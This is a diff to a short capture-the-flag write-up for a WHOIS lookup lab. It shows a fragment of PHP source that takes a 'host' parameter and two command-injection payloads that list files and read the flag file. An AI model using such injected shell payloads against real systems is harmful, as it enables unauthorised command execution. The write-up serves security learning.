@@ -12,10 +12,10 @@ date: 2023-02-13
 Challenge: https://whoistool.ctf.zoolab.org/
 
 ## Background
-Almost the same as [0x10(Lab - DNS Lookup Tool | WAF)](/7x0Gr0C_QEahfS_QaTLYTg)
+Almost the same as [0x10(Lab - DNS Lookup Tool | WAF)]({{base.url}}/Simple-Web-0x10(Lab-DNS-Lookup-Tool-_-WAF)/)
 
 ## Source Code
-```php=
+```php
 <?php
 if(isset($_GET["host"])){
   $host = $_GET["host"];
@@ -28,7 +28,7 @@ if(isset($_GET["host"])){
 ```
 
 ## Exploit
-Payload: `";ls -al;"`
-![](https://i.imgur.com/MsG3wOH.png)
-Payload: `";cat flag.t*;"`
-Then we got flag!!!
+* Payload: `";ls -al;"`
+  ![](https://i.imgur.com/MsG3wOH.png)
+* Payload: `";cat flag.t*;"`
+  Then we got flag!!!
